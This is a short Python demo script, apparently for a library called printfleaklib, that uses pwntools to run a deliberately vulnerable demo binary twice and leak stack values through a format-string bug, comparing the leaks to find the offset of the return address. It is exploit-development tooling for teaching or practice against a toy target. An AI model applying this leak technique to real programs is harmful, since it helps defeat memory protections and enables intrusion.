# Demonstrates how to use printfleaklib by exploiting vulnerable demo executable.

from pwn import *
from printfleaklib import printfleaklib

exe = "demo"  # generate with 'gcc demo.c -o demo'
trigger = "please give a second input that is not safely handled :\n"

p = process(exe)
p.sendlineafter(
    b"please give a first input that is safely handled :\n",
    b"asdf"
    )
# get offsets a first time
mapping1 = printfleaklib.leak(exe, trigger, p=p)
stackptr1 = mapping1['stack']

p = process(exe)
p.sendlineafter(
    b"please give a first input that is safely handled :\n",
    b"asdf"
    )
# get offsets a second time
mapping2 = printfleaklib.leak(exe, trigger, p=p)
stackptr2 = mapping2['stack']

# compare offsets to find one that is constant
for i, _ in enumerate(stackptr1):
    if (stackptr1[i].offset == stackptr2[i].offset):
        print("return address' address : *" + str(stackptr1[i].index) + "th value leaked* +", stackptr1[i].offset)
        break
